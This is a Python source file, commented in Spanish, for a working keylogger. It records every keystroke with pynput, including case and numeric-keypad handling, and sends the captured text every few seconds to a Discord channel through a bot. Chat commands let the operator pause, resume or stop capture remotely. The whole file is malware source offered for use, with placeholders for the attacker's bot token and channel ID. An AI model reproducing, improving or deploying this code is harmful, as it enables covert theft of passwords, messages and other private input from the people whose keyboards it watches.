import discord
import asyncio
import time
import ctypes
from pynput import keyboard
import sys

# --- CONFIGURACIÓN ---
BOT_TOKEN = "UR_BOT_TOKEN"  # Add ur requeriment in this line
CANAL_ID_LOGS = UR_DISCORD_CHANEL_ID  #Add ur requeriment in this line
INTERVALO_ENVIO = 5
LONGITUD_MAXIMA_LOG = 1500
# --- FIN DE CONFIGURACIÓN ---

# --- Variables globales ---
log_buffer = ""
last_activity_time = time.time()
shift_presionado = False
activo = True  # Para pausar/reanudar la captura

# --- Mapa del teclado numérico ---
NUMPAD_MAP = {
    '<96>': '0', '<97>': '1', '<98>': '2', '<99>': '3', '<100>': '4',
    '<101>': '5', '<102>': '6', '<103>': '7', '<104>': '8', '<105>': '9',
    '<110>': '.', '<106>': '*', '<107>': '+', '<109>': '-', '<111>': '/'
}

# --- Funciones del keylogger ---
def es_caps_lock_activo():
    try:
        return (ctypes.windll.user32.GetKeyState(0x14) & 0x0001) != 0
    except:
        return False

def on_press(key):
    global log_buffer, last_activity_time, shift_presionado, activo
    if not activo:
        return

    last_activity_time = time.time()

    if key in [keyboard.Key.shift, keyboard.Key.shift_r]:
        shift_presionado = True
        return

    if hasattr(key, 'char') and key.char:
        char = key.char
        char = char.upper() if shift_presionado ^ es_caps_lock_activo() else char.lower()
        if ord(char) > 31:
            log_buffer += char
    else:
        k_str = str(key)
        if k_str in NUMPAD_MAP:
            log_buffer += NUMPAD_MAP[k_str]
        elif key == keyboard.Key.space:
            log_buffer += " "
        elif key == keyboard.Key.enter:
            log_buffer += "\n"
        elif key == keyboard.Key.backspace:
            log_buffer = log_buffer[:-1] if log_buffer else ""

def on_release(key):
    global shift_presionado
    if key in [keyboard.Key.shift, keyboard.Key.shift_r]:
        shift_presionado = False

# Iniciamos el listener
listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()

# --- Configuración del bot ---
intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True  # NECESARIO
client = discord.Client(intents=intents)

# --- Loop de reporte periódico ---
async def reporte_periodico():
    global log_buffer
    await client.wait_until_ready()
    canal = client.get_channel(CANAL_ID_LOGS)
    if not canal:
        print(f"ERROR: No se encontró el canal con ID {CANAL_ID_LOGS}")
        return

    print(f"Canal de logs encontrado: #{canal.name}. Iniciando reportes periódicos.")

    while not client.is_closed():
        await asyncio.sleep(INTERVALO_ENVIO)
        if log_buffer:
            mensaje = log_buffer
            log_buffer = ""
            try:
                for i in range(0, len(mensaje), 1900):
                    await canal.send(f"```{mensaje[i:i+1900]}```")
            except discord.errors.Forbidden:
                print("ERROR: El bot no tiene permisos para enviar mensajes en el canal.")
            except Exception as e:
                print(f"Error enviando mensaje: {e}")

# --- Comandos de control ---
@client.event
async def on_message(message):
    global activo
    if message.author == client.user:
        return

    contenido = message.content.lower()
    if contenido == "!exit":
        await message.channel.send("💀 Cerrando bot...")
        listener.stop()
        await client.close()
        sys.exit()  # Asegura que Python termine

    elif contenido == "!stop":
        activo = False
        await message.channel.send("⛔ Captura pausada")

    elif contenido == "!start":
        activo = True
        await message.channel.send("✅ Captura reanudada")

@client.event
async def on_ready():
    print('-' * 20)
    print(f'Bot conectado como: {client.user} (ID: {client.user.id})')
    print('-' * 20)
    client.loop.create_task(reporte_periodico())

def main():
    print("Iniciando bot de Discord...")
    try:
        client.run(BOT_TOKEN)
    except discord.errors.LoginFailure:
        print("ERROR: Token inválido.")
    except Exception as e:
        print(f"No se pudo iniciar el bot: {e}")

if __name__ == "__main__":
    main()